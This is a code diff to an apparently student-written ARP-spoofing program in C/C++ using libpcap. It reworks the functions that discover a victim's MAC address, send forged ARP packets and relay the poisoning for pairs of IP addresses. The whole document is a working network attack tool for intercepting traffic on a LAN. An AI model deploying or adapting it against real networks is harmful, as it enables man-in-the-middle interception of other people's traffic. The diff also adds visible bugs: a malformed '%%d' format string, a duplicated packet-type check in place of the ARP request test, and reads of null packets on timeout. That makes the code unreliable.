@@ -58,7 +58,7 @@ void FmtMacAddress(char *fmt_mac_addr,  uint8_t *mac_addr){
 
 #define IP_ALEN 4
 
-#define IP_ADDR_FMT "%d.%d.%d.%d"
+#define IP_ADDR_FMT "%%d.%d.%d.%d"
 #define IP_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3]
 
 int GetIpAddress(const char *ifname, uint8_t *ip_addr){
@@ -72,7 +72,7 @@ int GetIpAddress(const char *ifname, uint8_t *ip_addr){
 		return -1;
 	}
 
-	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
+	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
 	ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
 	if(ret < 0){
 		printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
@@ -118,7 +118,6 @@ int ArpGetMac(pcap_t *pcap, char *attacker_ip, char *attacker_mac, char *target_
 		const uint8_t *recv_packet;
 
 		res = pcap_next_ex(pcap, &header, &recv_packet);
-		if(res ==0) continue;
 		if(res == -1 || res == -2){
 			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res, pcap_geterr(pcap));
 			return EXIT_FAILURE;
@@ -131,24 +130,26 @@ int ArpGetMac(pcap_t *pcap, char *attacker_ip, char *attacker_mac, char *target_
 		if(recv->arp_.tip_ != htonl(Ip(attacker_ip))) continue;
 		if(recv->arp_.tmac_ != Mac(attacker_mac)) continue;
 
-		strcpy(target_mac, std::string(recv->arp_.smac_).c_str());		
+		strcpy(target_mac, std::string(recv->arp_.smac_).c_str());
+		printf("target_mac: %s\n",target_mac);
 		break;
 	}
 	return EXIT_SUCCESS;
 }
 
-int ArpSpoof(pcap_t *pcap, const char *ifname,char *sender_ip, char *target_ip, char *sender_mac){
+int ArpSpoof(pcap_t *pcap, const char *ifname,char *sender_ip, char *target_ip){
 	uint8_t attacker_mac_addr[6];
 	uint8_t attacker_ip_addr[4];
 	char attacker_mac[18];
 	char attacker_ip[16];
-	
+	char sender_mac[18];
+
 	GetMacAddress(ifname, attacker_mac_addr);
 	GetIpAddress(ifname, attacker_ip_addr);
 	FmtMacAddress(attacker_mac, attacker_mac_addr);
 	FmtIpAddress(attacker_ip, attacker_ip_addr);
 
-	if(sender_mac[0] == '\0' && ArpGetMac(pcap, attacker_ip,attacker_mac,sender_ip,sender_mac) == EXIT_FAILURE) return EXIT_FAILURE;
+	if(ArpGetMac(pcap, attacker_ip,attacker_mac,sender_ip,sender_mac) == EXIT_FAILURE) return EXIT_FAILURE;
 		
 	EthArpPacket packet;
 
@@ -171,49 +172,44 @@ int ArpSpoof(pcap_t *pcap, const char *ifname,char *sender_ip, char *target_ip, 
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		return EXIT_FAILURE;
 	}
-	
-	printf("%s is spoofed (target: %s)\n",sender_ip,target_ip);
-
 	return EXIT_SUCCESS;
 }
 
-bool CheckTime(time_t *last){
-	if(time(nullptr) - *last >= 0.5){
-		*last = time(nullptr);
+bool CheckTime(clock_t *time){
+	if(clock() - *time >= CLOCKS_PER_SEC){
+		*time = clock();
 		return true;
 	}
 	return false;
 }
 
-int Relay(pcap_t *pcap, const char *ifname, char *ip_pair[], int pair_num, time_t *last){
-	char sender_mac[100][18]={'\0',};
+int Relay(pcap_t *pcap, const char *ifname, char *ip_pair[], int pair_num, clock_t *time){
 	while(true){
-		if(*last == -1 || CheckTime(last)){
-			for(int i=2;i<pair_num;i+=2) ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1],sender_mac[i/2-1]);
+		if(*time == -1 || CheckTime(time)){
+			for(int i=2;i<pair_num;i+=2) ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1]);
+			return EXIT_SUCCESS;
 		}
 
-		struct pcap_pkthdr *header;
+		struct pcap_pkthdr* header;
 		const uint8_t *recv_packet;
 
 		int res = pcap_next_ex(pcap, &header, &recv_packet);
-		if(res == 0) continue;
 		if(res == -1 || res == -2){
 			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res, pcap_geterr(pcap));
 			return EXIT_FAILURE;
 		}
 		EthArpPacket* recv = (EthArpPacket*)recv_packet;
 
-		if(ntohs(recv->eth_.type_) == EthHdr::Arp && ntohs(recv->arp_.op_) == ArpHdr::Request){
+		if(ntohs(recv->eth_.type_) == EthHdr::Arp && ntohs(recv->eth_.type_) == EthHdr::Arp){
 			for(int i=2;i<pair_num;i+=2){
 				if(recv->arp_.sip_ == Ip(ip_pair[i]) && recv->arp_.tip_ == Ip(ip_pair[i+1])){
-					for(int j=0;j<3;j++){
-						ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1],sender_mac[i/2-1]);
-						sleep(0.5);
-					}
+					ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1]);
+					return EXIT_SUCCESS;
 				}
 			}
 		}
 	}
+
 }
 
 int main(int argc, char* argv[]) {
@@ -231,11 +227,15 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 	
-	time_t last = -1;
+	clock_t time = -1;
 
-	if(Relay(pcap,dev,argv,argc,&last) == EXIT_FAILURE){
-		pcap_close(pcap);
-		return EXIT_FAILURE;
+	while(true){
+		if(Relay(pcap,dev,argv,argc,&time) == EXIT_FAILURE){
+			pcap_close(pcap);
+			return EXIT_FAILURE;
+		}
 	}
+	
+	pcap_close(pcap);
 }
 
